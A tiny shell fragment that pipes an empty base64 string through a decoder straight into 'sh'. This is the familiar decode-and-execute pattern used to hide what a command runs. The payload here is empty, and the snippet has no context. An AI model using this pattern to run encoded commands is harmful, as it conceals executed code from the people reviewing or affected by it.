echo
'' | base64 -d | sh